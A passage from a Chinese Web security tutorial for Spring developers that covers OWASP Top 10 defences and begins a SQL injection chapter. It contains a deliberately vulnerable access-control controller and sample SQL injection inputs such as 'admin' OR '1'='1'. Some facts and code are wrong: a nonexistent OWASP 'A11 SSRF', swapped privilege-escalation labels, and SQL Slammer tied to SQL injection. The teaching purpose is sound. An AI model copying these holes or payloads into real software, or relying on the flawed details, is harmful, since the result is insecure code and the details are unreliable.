# Web安全与渗透测试详解

> 本文档系统性地介绍Web安全与渗透测试的核心知识体系，涵盖攻击原理、防御方案、代码实现与实战案例，面向Java/Spring开发者与安全工程师。

---

## 目录

1. [Web安全概述](#1-web安全概述)
2. [OWASP Top 10 详解](#2-owasp-top-10-详解)
3. [SQL注入攻击与防御](#3-sql注入攻击与防御)
4. [XSS跨站脚本攻击](#4-xss跨站脚本攻击)
5. [CSRF跨站请求伪造](#5-csrf跨站请求伪造)
6. [SSRF服务端请求伪造](#6-ssrf服务端请求伪造)
7. [文件上传与文件包含漏洞](#7-文件上传与文件包含漏洞)
8. [认证与授权安全](#8-认证与授权安全)
9. [加密与数据安全](#9-加密与数据安全)
10. [API安全](#10-api安全)
11. [反序列化漏洞](#11-反序列化漏洞)
12. [XXE XML外部实体注入](#12-xxe-xml外部实体注入)
13. [日志与安全监控](#13-日志与安全监控)
14. [渗透测试方法论](#14-渗透测试方法论)
15. [安全编码规范](#15-安全编码规范)
16. [DevSecOps](#16-devsecops)
17. [实战案例](#17-实战案例)

---

## 1. Web安全概述

### 1.1 Web安全发展历程

Web安全的发展与互联网技术的演进密不可分。从早期简单的静态页面到如今复杂的微服务架构，安全威胁也在不断演变。

```
Web安全发展时间线
═══════════════════════════════════════════════════════════════════

1990s  ──── 静态HTML时代
  │         威胁: 几乎没有动态交互，安全威胁极少
  │
2000s  ──── 动态Web时代(Web 2.0)
  │         威胁: SQL注入、XSS、CSRF开始出现
  │         防御: 输入验证、参数化查询
  │
2010s  ──── 移动互联网与API时代
  │         威胁: API滥用、OAuth漏洞、反序列化攻击
  │         防御: OWASP Top 10、WAF、SDL
  │
2020s  ──── 云原生与微服务时代
  │         威胁: 容器逃逸、供应链攻击、零日漏洞
  │         防御: DevSecOps、零信任、SASE
  │
═══════════════════════════════════════════════════════════════════
```

**关键里程碑事件：**

| 年份 | 事件 | 影响 |
|------|------|------|
| 2003 | SQL Slammer蠕虫爆发 | 暴露SQL注入的严重性 |
| 2005 | MySpace Samy蠕虫 | 首次大规模XSS蠕虫攻击 |
| 2008 | Heartland数据泄露 | 1.3亿信用卡号被盗 |
| 2010 | Stuxnet震网病毒 | 首次国家级网络武器 |
| 2013 | Target数据泄露 | 4000万信用卡信息泄露 |
| 2014 | OpenSSL Heartbleed | 影响全球2/3的HTTPS网站 |
| 2015 | Ashley Madison泄露 | 影响3700万用户 |
| 2017 | Equifax数据泄露 | 1.47亿人信息泄露 |
| 2017 | Apache Struts2漏洞 | 导致Equifax泄露的根因 |
| 2019 | Capital One泄露 | 1.06亿客户数据泄露 |
| 2020 | SolarWinds供应链攻击 | 影响18000家机构 |
| 2021 | Log4Shell漏洞 | 影响全球数百万Java应用 |
| 2023 | MOVEit Transfer漏洞 | 影响全球数千家组织 |

### 1.2 安全威胁分类

Web安全威胁可以从多个维度进行分类：

```
┌─────────────────────────────────────────────────────────────┐
│                    Web安全威胁分类体系                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  攻击目标     │  │  攻击方式     │  │  攻击层级     │      │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤      │
│  │ • 服务器      │  │ • 主动攻击    │  │ • 应用层      │      │
│  │ • 客户端      │  │ • 被动攻击    │  │ • 传输层      │      │
│  │ • 通信链路    │  │ • 社会工程    │  │ • 网络层      │      │
│  │ • 数据库      │  │ • 暴力破解    │  │ • 物理层      │      │
│  │ • 中间件      │  │ • 逻辑漏洞    │  │ • 系统层      │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                             │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐      │
│  │  影响程度     │  │  攻击复杂度   │  │  检测难度     │      │
│  ├──────────────┤  ├──────────────┤  ├──────────────┤      │
│  │ • 致命        │  │ • 低         │  │ • 容易检测    │      │
│  │ • 严重        │  │ • 中         │  │ • 中等难度    │      │
│  │ • 中等        │  │ • 高         │  │ • 难以检测    │      │
│  │ • 轻微        │  │ • 专家级     │  │ • 极难检测    │      │
│  └──────────────┘  └──────────────┘  └──────────────┘      │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**按OWASP分类的常见Web威胁：**

1. **注入类攻击** - SQL注入、命令注入、LDAP注入、XPATH注入
2. **认证与会话管理** - 暴力破解、会话劫持、凭据填充
3. **跨站脚本** - 反射型XSS、存储型XSS、DOM型XSS
4. **访问控制缺陷** - 越权访问、目录遍历、权限提升
5. **安全配置错误** - 默认配置、目录列表、错误信息泄露
6. **加密失败** - 弱加密、明文传输、硬编码密钥
7. **反序列化漏洞** - Java反序列化、PHP反序列化、Python pickle
8. **已知漏洞组件** - 过时框架、未修补依赖
9. **日志不足** - 攻击不可追溯、告警缺失
10. **SSRF** - 内网探测、协议利用、云元数据泄露

### 1.3 攻防方法论

安全攻防遵循"STRIDE"威胁模型和"纵深防御"策略：

```
STRIDE威胁模型
═══════════════════════════════════════════════════════════════════

┌──────────┬──────────────────────┬─────────────────────┐
│  威胁类型 │      威胁描述         │    对应安全属性      │
├──────────┼──────────────────────┼─────────────────────┤
│ S - Spoofing      │ 身份伪造          │ 认证(Authentication) │
│ T - Tampering     │ 数据篡改          │ 完整性(Integrity)    │
│ R - Repudiation   │ 否认操作          │ 不可抵赖(Non-repudiation) │
│ I - Info Disclosure│ 信息泄露         │ 机密性(Confidentiality)  │
│ D - DoS           │ 拒绝服务          │ 可用性(Availability) │
│ E - EoP           │ 权限提升          │ 授权(Authorization)  │
└──────────┴──────────────────────┴─────────────────────┘

纵深防御模型 (Defense in Depth)
═══════════════════════════════════════════════════════════════════

  ┌─────────────────────────────────────────────────────┐
  │                   物理安全层                          │
  │  ┌─────────────────────────────────────────────────┐│
  │  │                 网络安全层                        ││
  │  │  ┌─────────────────────────────────────────────┐││
  │  │  │              主机安全层                      │││
  │  │  │  ┌─────────────────────────────────────────┐│││
  │  │  │  │            应用安全层                    ││││
  │  │  │  │  ┌─────────────────────────────────────┐││││
  │  │  │  │  │           数据安全层                 │││││
  │  │  │  │  └─────────────────────────────────────┘││││
  │  │  │  └─────────────────────────────────────────┘│││
  │  │  └─────────────────────────────────────────────┘││
  │  └─────────────────────────────────────────────────┘│
  └─────────────────────────────────────────────────────┘
```

**攻击者思维框架 (Cyber Kill Chain)：**

```
侦察 → 武器化 → 投递 → 利用 → 安装 → 命令控制 → 目标行动
  │        │       │      │      │        │          │
  ▼        ▼       ▼      ▼      ▼        ▼          ▼
信息    构造    发送    触发    植入    C2通道     数据窃取
收集    攻击    载荷    漏洞    后门    建立       破坏
        载荷            利用
```

### 1.4 安全开发生命周期(SDL)

Microsoft SDL（Security Development Lifecycle）是业界广泛采用的安全开发流程：

```
SDL安全开发生命周期
═══════════════════════════════════════════════════════════════════

  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  培训阶段 │ → │  需求阶段 │ → │  设计阶段 │ → │  实现阶段 │
  │          │   │          │   │          │   │          │
  │• 安全意识 │   │• 安全需求 │   │• 威胁建模 │   │• 安全编码 │
  │• 安全规范 │   │• 风险评估 │   │• 攻击面  │   │• 静态分析 │
  │• 合规培训 │   │• 隐私评估 │   │  分析    │   │• 代码审查 │
  └──────────┘   └──────────┘   └──────────┘   └──────────┘
        ↑                                              │
        │                                              ▼
  ┌──────────┐   ┌──────────┐   ┌──────────┐   ┌──────────┐
  │  响应阶段 │ ← │  发布阶段 │ ← │  验证阶段 │ ← │  测试阶段 │
  │          │   │          │   │          │   │          │
  │• 应急响应 │   │• 最终安全 │   │• 模糊测试 │   │• 渗透测试 │
  │• 漏洞修补 │   │  审查     │   │• 动态分析 │   │• 安全测试 │
  │• 事后复盘 │   │• 发布归档 │   │• 渗透测试 │   │• 漏洞扫描 │
  └──────────┘   └──────────┘   └──────────┘   └──────────┘
```

**Spring Boot项目SDL实践示例：**

```java
@Configuration
public class SecuritySDLConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp
                    .policyDirectives("default-src 'self'; "
                        + "script-src 'self'; "
                        + "style-src 'self' 'unsafe-inline'; "
                        + "img-src 'self' data:; "
                        + "font-src 'self'; "
                        + "connect-src 'self'; "
                        + "frame-ancestors 'none'; "
                        + "form-action 'self'")
                )
                .xssProtection(xss -> xss.headerValue(XXssProtectionHeader.HeaderValue.ENABLED_MODE_BLOCK))
                .contentTypeOptions(Customizer.withDefaults())
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true)
                    .maxAgeInSeconds(31536000)
                    .preload(true)
                )
            )
            .sessionManagement(session -> session
                .sessionCreationPolicy(SessionCreationPolicy.STATELESS)
                .sessionFixation(fixation -> fixation.migrateSession())
            )
            .csrf(csrf -> csrf
                .csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse())
                .csrfTokenRequestHandler(new CsrfTokenRequestAttributeHandler())
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/api/public/**").permitAll()
                .requestMatchers("/api/admin/**").hasRole("ADMIN")
                .requestMatchers("/api/user/**").hasAnyRole("USER", "ADMIN")
                .anyRequest().authenticated()
            );
        return http.build();
    }

    @Bean
    public PasswordEncoder passwordEncoder() {
        return new Argon2PasswordEncoder(16, 32, 1, 65536, 3);
    }
}
```

### 1.5 FAQ

**Q1: Web安全和网络安全有什么区别？**

A: 网络安全是更广泛的概念，涵盖网络基础设施、通信协议等层面的安全；Web安全专注于Web应用层的安全，是网络安全在应用层的子集。Web安全关注HTTP协议、浏览器、Web服务器和应用代码的安全问题。

**Q2: 为什么安全要在开发早期介入？**

A: 安全缺陷修复成本随发现阶段呈指数增长。需求阶段修复一个安全缺陷的成本是1x，设计阶段是6x，编码阶段是15x，测试阶段是60x，生产阶段是100x以上。这就是"安全左移"的核心原因。

**Q3: SDL和DevSecOps有什么区别？**

A: SDL是微软提出的结构化安全开发流程，强调阶段性和门控；DevSecOps强调将安全自动化集成到CI/CD流水线中，实现持续安全。DevSecOps可以看作SDL在敏捷/DevOps环境下的演进。

---

## 2. OWASP Top 10 详解

### 2.1 OWASP组织与Top 10概述

OWASP（Open Web Application Security Project）是开放Web应用安全项目，是一个全球性的非营利组织，致力于提升软件安全。

```
OWASP Top 10 演进 (2013 → 2017 → 2021)
═══════════════════════════════════════════════════════════════════

2013版              2017版              2021版
─────────           ─────────          ─────────
A1 注入             A1 注入             A03 注入
A2 失效的认证       A2 失效的认证       A07 身份认证失败
A3 XSS              A3 敏感数据泄露     A02 加密失败
A4 不安全对象引用   A4 XML外部实体     A05 安全配置错误
A5 安全配置错误     A5 失效的访问控制   A01 访问控制失败
A6 敏感数据泄露     A6 安全配置错误     A04 不安全设计
A7 功能级访问控制   A7 XSS             A09 组件漏洞
A8 CSRF             A8 不安全反序列化   A08 数据完整性失败
A9 已知漏洞组件     A9 已知漏洞组件     A10 日志不足
A10 未验证重定向    A10 日志不足        A06 过时组件
                                        + A11 SSRF(新增)
═══════════════════════════════════════════════════════════════════
```

### 2.2 A01:2021 - 失效的访问控制

访问控制失效是最严重的Web安全风险，包括越权访问、目录遍历、IDOR等。

```
访问控制失效攻击场景
═══════════════════════════════════════════════════════════════════

  攻击者                        服务器
    │                            │
    │  GET /api/user/123/profile │  ← 垂直越权
    │ ─────────────────────────→ │
    │                            │  未校验当前用户是否为123
    │  200 OK + 敏感数据         │
    │ ←───────────────────────── │
    │                            │
    │  GET /api/admin/dashboard  │  ← 水平越权
    │ ─────────────────────────→ │
    │                            │  仅检查是否登录,未检查角色
    │  200 OK + 管理数据         │
    │ ←───────────────────────── │
    │                            │
    │  POST /api/user/role       │  ← IDOR
    │  {role: "admin"}           │
    │ ─────────────────────────→ │
    │                            │  未校验请求体中的角色字段
    │  200 OK                    │
    │ ←───────────────────────── │
═══════════════════════════════════════════════════════════════════
```

**脆弱代码示例：**

```java
@RestController
@RequestMapping("/api/user")
public class VulnerableUserController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/{id}/profile")
    public User getProfile(@PathVariable Long id) {
        return userRepository.findById(id);
    }

    @PutMapping("/{id}")
    public User updateUser(@PathVariable Long id, @RequestBody UserUpdateDTO dto) {
        User user = userRepository.findById(id);
        user.setRole(dto.getRole());
        user.setEmail(dto.getEmail());
        return userRepository.save(user);
    }

    @DeleteMapping("/{id}")
    public void deleteUser(@PathVariable Long id) {
        userRepository.deleteById(id);
    }
}
```

**安全代码示例：**

```java
@RestController
@RequestMapping("/api/user")
public class SecureUserController {

    @Autowired
    private UserRepository userRepository;

    @GetMapping("/{id}/profile")
    public User getProfile(@PathVariable Long id, @AuthenticationPrincipal UserDetails currentUser) {
        if (!currentUser.getId().equals(id) && !currentUser.hasRole("ADMIN")) {
            throw new AccessDeniedException("无权访问其他用户信息");
        }
        User user = userRepository.findById(id);
        return user.toSafeView();
    }

    @PutMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN') or #id == authentication.principal.id")
    public User updateUser(@PathVariable Long id, @RequestBody UserUpdateDTO dto,
                          @AuthenticationPrincipal UserDetails currentUser) {
        User user = userRepository.findById(id);
        if (!currentUser.hasRole("ADMIN")) {
            dto.setRole(null);
        }
        user.setEmail(dto.getEmail());
        return userRepository.save(user);
    }

    @DeleteMapping("/{id}")
    @PreAuthorize("hasRole('ADMIN')")
    public void deleteUser(@PathVariable Long id) {
        auditLogService.log("DELETE_USER", id, currentUser.getId());
        userRepository.deleteById(id);
    }
}
```

### 2.3 A02:2021 - 加密失败

以前称为"敏感数据泄露"，2021版更名为"加密失败"，强调根本原因是加密措施不足。

**常见加密失败场景：**

| 场景 | 描述 | 风险等级 |
|------|------|----------|
| HTTP明文传输 | 未启用HTTPS/TLS | 严重 |
| 弱哈希算法 | 使用MD5/SHA1存储密码 | 高 |
| 硬编码密钥 | 代码中硬编码加密密钥 | 高 |
| 不安全随机数 | 使用java.util.Random生成Token | 中 |
| 过时加密算法 | 使用DES/3DES/RC4 | 高 |
| 密钥管理不当 | 密钥与数据存储在同一位置 | 高 |

**安全代码示例：**

```java
public class SecureCryptoService {

    private static final String AES_ALGORITHM = "AES/GCM/NoPadding";
    private static final int GCM_TAG_LENGTH = 128;
    private static final int GCM_IV_LENGTH = 12;

    private final KeyVaultClient keyVaultClient;

    public SecureCryptoService(KeyVaultClient keyVaultClient) {
        this.keyVaultClient = keyVaultClient;
    }

    public String encrypt(String plaintext) {
        try {
            byte[] iv = new byte[GCM_IV_LENGTH];
            SecureRandom.getInstanceStrong().nextBytes(iv);
            SecretKey key = keyVaultClient.getEncryptionKey();
            GCMParameterSpec parameterSpec = new GCMParameterSpec(GCM_TAG_LENGTH, iv);
            Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
            cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);
            byte[] ciphertext = cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));
            ByteBuffer byteBuffer = ByteBuffer.allocate(iv.length + ciphertext.length);
            byteBuffer.put(iv);
            byteBuffer.put(ciphertext);
            return Base64.getEncoder().encodeToString(byteBuffer.array());
        } catch (Exception e) {
            throw new SecurityException("加密失败", e);
        }
    }

    public String decrypt(String encrypted) {
        try {
            byte[] decoded = Base64.getDecoder().decode(encrypted);
            ByteBuffer byteBuffer = ByteBuffer.wrap(decoded);
            byte[] iv = new byte[GCM_IV_LENGTH];
            byteBuffer.get(iv);
            byte[] ciphertext = new byte[byteBuffer.remaining()];
            byteBuffer.get(ciphertext);
            SecretKey key = keyVaultClient.getEncryptionKey();
            Cipher cipher = Cipher.getInstance(AES_ALGORITHM);
            cipher.init(Cipher.DECRYPT_MODE, key, new GCMParameterSpec(GCM_TAG_LENGTH, iv));
            return new String(cipher.doFinal(ciphertext), StandardCharsets.UTF_8);
        } catch (Exception e) {
            throw new SecurityException("解密失败", e);
        }
    }

    public String hashPassword(String password) {
        return BCrypt.withDefaults().hashToString(12, password.toCharArray());
    }

    public boolean verifyPassword(String password, String hash) {
        return BCrypt.verifyer().verify(password.toCharArray(), hash).verified;
    }

    public String generateSecureToken() {
        byte[] tokenBytes = new byte[32];
        try {
            SecureRandom.getInstanceStrong().nextBytes(tokenBytes);
        } catch (NoSuchAlgorithmException e) {
            throw new SecurityException("生成安全令牌失败", e);
        }
        return Hex.encodeHexString(tokenBytes);
    }
}
```

### 2.4 A03:2021 - 注入

注入攻击涵盖SQL注入、命令注入、LDAP注入、XPATH注入、模板注入等。详细内容见第3章。

**各类注入攻击对比：**

```
┌─────────────┬──────────────────────┬────────────────────┐
│  注入类型    │      攻击向量         │    影响范围         │
├─────────────┼──────────────────────┼────────────────────┤
│ SQL注入     │ 数据库查询语句        │ 数据库数据          │
│ 命令注入    │ 操作系统命令          │ 服务器系统          │
│ LDAP注入    │ LDAP查询过滤器        │ 目录服务            │
│ XPATH注入   │ XPATH表达式          │ XML数据             │
│ SSTI        │ 模板引擎表达式        │ 服务器代码执行       │
│ EL注入      │ 表达式语言            │ 应用逻辑            │
│ Header注入  │ HTTP头部字段          │ 缓存/请求走私       │
│ CRLF注入    │ 换行符               │ HTTP响应分割        │
└─────────────┴──────────────────────┴────────────────────┘
```

**命令注入防御示例：**

```java
@Service
public class SecureCommandService {

    private static final Set<String> ALLOWED_COMMANDS = Set.of("ls", "cat", "grep");
    private static final Pattern SAFE_INPUT_PATTERN = Pattern.compile("^[a-zA-Z0-9._/-]+$");

    public String executeCommand(String command, String argument) {
        if (!ALLOWED_COMMANDS.contains(command)) {
            throw new SecurityException("不允许执行的命令: " + command);
        }

        if (!SAFE_INPUT_PATTERN.matcher(argument).matches()) {
            throw new SecurityException("参数包含非法字符: " + argument);
        }

        try {
            ProcessBuilder pb = new ProcessBuilder(command, argument);
            pb.redirectErrorStream(true);
            Process process = pb.start();
            String output = new String(process.getInputStream().readAllBytes(), StandardCharsets.UTF_8);
            int exitCode = process.waitFor();

            if (exitCode != 0) {
                throw new RuntimeException("命令执行失败, 退出码: " + exitCode);
            }
            return output;
        } catch (IOException | InterruptedException e) {
            throw new RuntimeException("命令执行异常", e);
        }
    }
}
```

### 2.5 A04:2021 - 不安全设计

2021版新增类别，强调安全设计的重要性。不安全设计与安全实现缺陷不同，即使实现完全正确，设计本身的安全缺陷也无法通过更好的实现来弥补。

**威胁建模示例 - 使用STRIDE方法分析用户注册功能：**

```
用户注册功能威胁建模
═══════════════════════════════════════════════════════════════════

┌──────────┬────────────────────────┬───────────────────────┐
│ 威胁类型  │      具体威胁           │    缓解措施            │
├──────────┼────────────────────────┼───────────────────────┤
│ S 伪造   │ 使用他人邮箱注册        │ 邮箱验证码确认         │
│ T 篡改   │ 修改验证绕过逻辑        │ 服务端验证,签名Token   │
│ R 否认   │ 否认注册行为           │ 记录注册审计日志       │
│ I 泄露   │ 用户枚举               │ 统一错误提示           │
│ D 拒绝   │ 批量注册消耗资源        │ 限流+CAPTCHA          │
│ E 提权   │ 注册时指定管理员角色    │ 不允许客户端指定角色   │
└──────────┴────────────────────────┴───────────────────────┘
```

**安全设计模式：**

```java
@Service
public class SecureRegistrationService {

    private static final int MAX_REGISTRATION_PER_IP_PER_HOUR = 5;
    private static final int MAX_REGISTRATION_PER_EMAIL_PER_DAY = 3;

    @Autowired
    private UserRepository userRepository;
    @Autowired
    private RateLimitService rateLimitService;
    @Autowired
    private EmailVerificationService emailVerificationService;
    @Autowired
    private AuditLogService auditLogService;

    public RegistrationResult register(RegistrationRequest request, String clientIp) {
        if (rateLimitService.isRateLimited("reg:ip:" + clientIp,
                MAX_REGISTRATION_PER_IP_PER_HOUR, Duration.ofHours(1))) {
            auditLogService.log("REGISTRATION_RATE_LIMITED", clientIp, request.getEmail());
            return RegistrationResult.rateLimited();
        }

        if (rateLimitService.isRateLimited("reg:email:" + request.getEmail(),
                MAX_REGISTRATION_PER_EMAIL_PER_DAY, Duration.ofDays(1))) {
            return RegistrationResult.rateLimited();
        }

        if (userRepository.existsByEmail(request.getEmail())) {
            emailVerificationService.sendAlreadyRegisteredNotice(request.getEmail());
            return RegistrationResult.success();
        }

        User user = User.builder()
            .email(request.getEmail())
            .password(passwordEncoder.encode(request.getPassword()))
            .role(Role.USER)
            .status(Status.PENDING_VERIFICATION)
            .build();

        user = userRepository.save(user);
        emailVerificationService.sendVerificationEmail(user);
        auditLogService.log("USER_REGISTERED", user.getId(), clientIp);
        return RegistrationResult.success();
    }
}
```

### 2.6 A05:2021 - 安全配置错误

**常见安全配置错误清单：**

```
┌─────────────────────────────────────────────────────────────┐
│                 安全配置错误检查清单                          │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  □ 服务器配置                                                │
│    □ 是否关闭了目录列表                                      │
│    □ 是否删除了默认账户和密码                                 │
│    □ 是否关闭了不必要的端口和服务                              │
│    □ 是否配置了安全响应头                                     │
│                                                             │
│  □ 应用配置                                                  │
│    □ 是否关闭了调试模式                                       │
│    □ 是否关闭了Swagger/API文档的生产访问                      │
│    □ 是否关闭了Spring Boot Actuator敏感端点                   │
│    □ 是否配置了正确的CORS策略                                 │
│    □ 是否关闭了TRACE方法                                      │
│                                                             │
│  □ 框架配置                                                  │
│    □ 是否移除了示例应用                                       │
│    □ 是否更新了默认密钥                                       │
│    □ 是否配置了安全的Cookie属性                               │
│    □ 是否启用了HTTPS                                         │
│                                                             │
│  □ 云配置                                                    │
│    □ 是否限制了S3 Bucket权限                                  │
│    □ 是否关闭了云元数据端点的公网访问                          │
│    □ 是否配置了安全组规则                                     │
│    □ 是否启用了WAF                                           │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

**Spring Boot安全配置模板：**

```java
@Configuration
public class SecureApplicationConfig {

    @Bean
    public SecurityFilterChain securityFilterChain(HttpSecurity http) throws Exception {
        http
            .cors(cors -> cors.configurationSource(corsConfigurationSource()))
            .csrf(csrf -> csrf.csrfTokenRepository(CookieCsrfTokenRepository.withHttpOnlyFalse()))
            .headers(headers -> headers
                .contentSecurityPolicy(csp -> csp.policyDirectives(
                    "default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'"))
                .frameOptions(HeadersConfigurer.FrameOptionsConfig::deny)
                .httpStrictTransportSecurity(hsts -> hsts
                    .includeSubDomains(true).maxAgeInSeconds(31536000).preload(true))
                .xssProtection(xss -> xss.headerValue(
                    XXssProtectionHeader.HeaderValue.ENABLED_MODE_BLOCK))
            )
            .authorizeHttpRequests(auth -> auth
                .requestMatchers("/actuator/health").permitAll()
                .requestMatchers("/actuator/**").denyAll()
                .requestMatchers("/swagger-ui/**", "/v3/api-docs/**").denyAll()
                .requestMatchers("/api/public/**").permitAll()
                .anyRequest().authenticated()
            );
        return http.build();
    }

    @Bean
    public CorsConfigurationSource corsConfigurationSource() {
        CorsConfiguration configuration = new CorsConfiguration();
        configuration.setAllowedOrigins(List.of("https://app.example.com"));
        configuration.setAllowedMethods(List.of("GET", "POST", "PUT", "DELETE"));
        configuration.setAllowedHeaders(List.of("Authorization", "Content-Type", "X-CSRF-Token"));
        configuration.setAllowCredentials(true);
        configuration.setMaxAge(3600L);

        UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
        source.registerCorsConfiguration("/api/**", configuration);
        return source;
    }
}
```

### 2.7 A06:2021 - 过时组件

**依赖安全检查流程：**

```
依赖安全检查流程
═══════════════════════════════════════════════════════════════════

  ┌──────────┐    ┌──────────┐    ┌──────────┐    ┌──────────┐
  │  依赖引入  │ →  │  版本检查  │ →  │  漏洞扫描  │ →  │  许可证   │
  │          │    │          │    │          │    │  合规检查 │
  │• 最小化   │    │• 最新版本 │    │• OWASP DC│    │• GPL     │
  │  依赖    │    │• 长期支持 │    │• Snyk    │    │• LGPL    │
  │• 官方源   │    │• 安全公告 │    │• Trivy   │    │• Apache  │
  │  仓库    │    │• CVE追踪  │    │• Dependabot│  │• MIT     │
  └──────────┘    └──────────┘    └──────────┘    └──────────┘
        │                                              │
        └──────────────────┬───────────────────────────┘
                           ▼
                    ┌──────────┐
                    │  审批通过  │
                    │  引入项目  │
                    └──────────┘
═══════════════════════════════════════════════════════════════════
```

**Maven依赖检查配置：**

```xml
<plugin>
    <groupId>org.owasp</groupId>
    <artifactId>dependency-check-maven</artifactId>
    <version>8.4.0</version>
    <configuration>
        <failBuildOnCVSS>7</failBuildOnCVSS>
        <suppressionFile>dependency-check-suppressions.xml</suppressionFile>
        <nvdApiKey>${NVD_API_KEY}</nvdApiKey>
        <analyzers>
            <ossindexEnabled>true</ossindexEnabled>
        </analyzers>
    </configuration>
    <executions>
        <execution>
            <goals>
                <goal>check</goal>
            </goals>
        </execution>
    </executions>
</plugin>
```

### 2.8 A07:2021 - 身份认证失败

**认证安全最佳实践：**

```java
@Service
public class SecureAuthenticationService {

    private static final int MAX_LOGIN_ATTEMPTS = 5;
    private static final long ACCOUNT_LOCK_DURATION_MINUTES = 30;

    @Autowired
    private UserRepository userRepository;
    @Autowired
    private LoginAttemptService loginAttemptService;
    @Autowired
    private AuditLogService auditLogService;
    @Autowired
    private MfaService mfaService;
    @Autowired
    private PasswordEncoder passwordEncoder;
    @Autowired
    private JwtTokenProvider jwtTokenProvider;

    public AuthenticationResult authenticate(LoginRequest request, String clientIp) {
        if (loginAttemptService.isBlocked(request.getUsername(), clientIp)) {
            auditLogService.log("LOGIN_BLOCKED", request.getUsername(), clientIp);
            return AuthenticationResult.blocked();
        }

        User user = userRepository.findByUsername(request.getUsername()).orElse(null);

        if (user == null || !passwordEncoder.matches(request.getPassword(), user.getPassword())) {
            loginAttemptService.recordFailedAttempt(request.getUsername(), clientIp);
            auditLogService.log("LOGIN_FAILED", request.getUsername(), clientIp);
            return AuthenticationResult.failed();
        }

        if (user.isLocked()) {
            return AuthenticationResult.locked();
        }

        if (user.isMfaEnabled()) {
            return AuthenticationResult.mfaRequired(user.getId());
        }

        loginAttemptService.resetAttempts(request.getUsername(), clientIp);
        auditLogService.log("LOGIN_SUCCESS", user.getId(), clientIp);

        String accessToken = jwtTokenProvider.createAccessToken(user);
        String refreshToken = jwtTokenProvider.createRefreshToken(user);
        return AuthenticationResult.success(accessToken, refreshToken);
    }

    public AuthenticationResult verifyMfa(Long userId, String code, String clientIp) {
        User user = userRepository.findById(userId).orElseThrow();
        if (!mfaService.verifyCode(user.getMfaSecret(), code)) {
            auditLogService.log("MFA_FAILED", userId, clientIp);
            return AuthenticationResult.failed();
        }
        auditLogService.log("MFA_SUCCESS", userId, clientIp);
        String accessToken = jwtTokenProvider.createAccessToken(user);
        String refreshToken = jwtTokenProvider.createRefreshToken(user);
        return AuthenticationResult.success(accessToken, refreshToken);
    }
}
```

### 2.9 A08:2021 - 软件和数据完整性失败

2021版新增类别，涵盖不安全的CI/CD流水线、未验证的自动更新、未签名的反序列化数据等。

**CI/CD安全配置：**

```yaml
name: Secure CI/CD Pipeline
on:
  push:
    branches: [main]
  pull_request:
    branches: [main]

jobs:
  security-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}

      - name: Verify Commit Signature
        run: |
          git log --pretty='%GF' -1 | grep -qE '^[0-9A-F]{40}$' || echo "Warning: Unsigned commit"

      - name: Dependency Check
        uses: dependency-check/Dependency-Check_Action@main
        with:
          project: 'my-project'
          path: '.'
          format: 'HTML'

      - name: SAST Scan
        uses: SonarSource/sonarcloud-github-action@master
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
          SONAR_TOKEN: ${{ secrets.SONAR_TOKEN }}

      - name: Container Scan
        run: |
          docker build -t myapp:scan .
          trivy image --exit-code 1 --severity HIGH,CRITICAL myapp:scan

      - name: Sign Artifact
        run: |
          cosign sign --key env://COSIGN_KEY myapp:latest
        env:
          COSIGN_KEY: ${{ secrets.COSIGN_PRIVATE_KEY }}
```

### 2.10 A09:2021 - 安全日志与监控不足

详细内容见第13章。

**关键日志事件清单：**

| 事件类别 | 具体事件 | 日志级别 |
|----------|----------|----------|
| 认证 | 登录成功/失败、MFA验证、密码修改 | SECURITY |
| 授权 | 访问拒绝、权限提升、角色变更 | SECURITY |
| 输入验证 | SQL注入尝试、XSS尝试、非法参数 | SECURITY |
| 数据访问 | 敏感数据查询、批量数据导出 | AUDIT |
| 系统配置 | 配置变更、密钥轮换、服务启停 | SECURITY |
| 业务逻辑 | 关键业务操作、金额变更 | AUDIT |

### 2.11 A10:2021 - 服务端请求伪造

2021版新增类别，详细内容见第6章。

### 2.12 FAQ

**Q1: OWASP Top 10多久更新一次？**

A: 大约每3-4年更新一次。2013版、2017版、2021版。每次更新都会根据社区数据和专家评估调整风险排名和类别。

**Q2: 如何在项目中落地OWASP Top 10的防御？**

A: 建议分三步：1) 建立安全编码规范，对照Top 10制定检查清单；2) 在CI/CD中集成SAST/DAST扫描工具；3) 定期进行安全培训和渗透测试。

**Q3: 不安全设计和安全配置错误的区别是什么？**

A: 不安全设计指架构/设计层面的缺陷（如缺少安全控制的设计），无法通过更好的实现来修复；安全配置错误是实现/配置层面的问题（如忘记关闭调试模式），可以通过正确的配置来修复。

---

## 3. SQL注入攻击与防御

### 3.1 SQL注入原理

SQL注入是最常见也最具破坏力的Web安全漏洞之一，攻击者通过在输入中插入SQL代码来操纵数据库查询。

```
SQL注入攻击原理
═══════════════════════════════════════════════════════════════════

正常请求:
  用户输入: admin
  SQL查询: SELECT * FROM users WHERE username = 'admin'

攻击请求:
  用户输入: admin' OR '1'='1
  SQL查询: SELECT * FROM users WHERE username = 'admin' OR '1'='1'
                                                        ↑
                                              条件永远为真,返回所有记录

攻击请求(注释符):
  用户输入: admin'--
